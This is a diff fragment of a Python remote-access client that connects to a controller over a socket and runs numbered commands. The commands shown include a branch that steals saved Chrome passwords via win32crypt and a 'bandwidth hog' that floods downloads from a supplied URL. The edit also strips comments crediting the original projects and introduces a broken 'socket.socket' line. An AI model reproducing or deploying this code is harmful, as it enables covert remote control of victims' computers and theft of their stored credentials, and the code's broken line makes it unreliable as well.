@@ -4,13 +4,14 @@ import socket
 from multiprocessing.dummy import Pool as ThreadPool
 from urllib.request import urlopen
 
-s = socket.socket()
 host = os.environ['COMPUTERNAME']  # author's PC is: "BlueEyesPC"; alt:  input(str("enter server addr: "))
+s = socket.socket 
 port = 8080
 s.connect((host, port))
 
-print("connected* ")
+print("Computers connected")
 
+#define socket : Define Port : Connect socket to host and port
 while 1:
     command = s.recv(1040)
     command = command.decode()
@@ -116,7 +117,6 @@ while 1:
 
     elif command == "11":
         # Get Chrome passwords list
-        # Original project:  https://github.com/alik604/chrome-password-thief/blob/master/chromePasswordThieve.py
         from shutil import copyfile
         from sqlite3 import connect
         import win32crypt
@@ -159,7 +159,6 @@ while 1:
 
     elif command == "12":
         # Bandwidth Hog
-        # Original project: https://github.com/alik604/bandwidth-hog/blob/master/bandwidth-hog.py
         URL = s.recv().decode()
         try:
             def doneloadInChucksButDoNotSave(URL=URL):
